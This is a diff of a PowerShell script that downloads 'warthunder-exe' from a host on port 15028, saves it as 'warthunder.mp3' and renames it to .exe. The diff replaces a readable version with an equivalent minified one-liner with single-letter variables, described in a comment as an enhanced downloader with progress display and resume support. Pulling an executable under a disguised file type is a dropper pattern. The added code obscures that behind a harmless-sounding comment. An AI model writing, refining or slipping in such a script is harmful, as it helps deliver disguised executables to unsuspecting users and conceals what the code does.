@@ -1,9 +1,3 @@
-$url = "http://mc.fissionhost.org:15028/warthunder-exe"
-$downloadPath = Join-Path $env:USERPROFILE "Downloads\warthunder.mp3"
-
-Invoke-WebRequest -Uri $url -OutFile $downloadPath
-$exePath = [System.IO.Path]::ChangeExtension($downloadPath, ".exe")
-Rename-Item -Path $downloadPath -NewName (Split-Path $exePath -Leaf)
-
-Write-Output "File downloaded to: $downloadPath"
+# Enhanced download with progress indicators (MBPS, ETA, %) and resume support
+$a="http://mc.fissionhost.org:15028/warthunder-exe";$b=Join-Path $env:USERPROFILE "Downloads\warthunder.mp3";$c=0;if(Test-Path $b){$c=(gi $b).Length}$d=New-Object Net.Http.HttpClient;$e=New-Object Net.Http.HttpRequestMessage 'GET' $a;if($c){$e.Headers.Range=New-Object Net.Http.Headers.RangeHeaderValue($c,$null)}$f=$d.SendAsync($e,[Net.Http.HttpCompletionOption]::ResponseHeadersRead).Result;if($f.Content.Headers.ContentRange){$g=$f.Content.Headers.ContentRange.Length}else{$g=$f.Content.Headers.ContentLength+$c}$h=$f.Content.ReadAsStreamAsync().Result;$i=[IO.FileMode]::Append;if(-not $c){$i=[IO.FileMode]::Create}$j=[IO.File]::Open($b,$i);$k=New-Object byte[] 8192;$l=$c;$m=[Diagnostics.Stopwatch]::StartNew();while(($n=$h.Read($k,0,$k.Length))){$j.Write($k,0,$n);$l+=$n;$o=$m.Elapsed.TotalSeconds;if($o){$p=[math]::Round(($l/1MB)/$o,2);$q=[math]::Round(($l/$g)*100,2);$r=if($l){[math]::Round(($g-$l)/($l/$o))}else{0};Write-Progress -Activity "Downloading" -Status "$q% ($p MBps, ETA: $r s)" -PercentComplete $q}}$j.Close();$h.Close();$d.Dispose();$s=[IO.Path]::ChangeExtension($b,".exe");Rename-Item $b -NewName (Split-Path $s -Leaf) -Force;Write-Output "File downloaded to: $s"
 # Press enter to complete
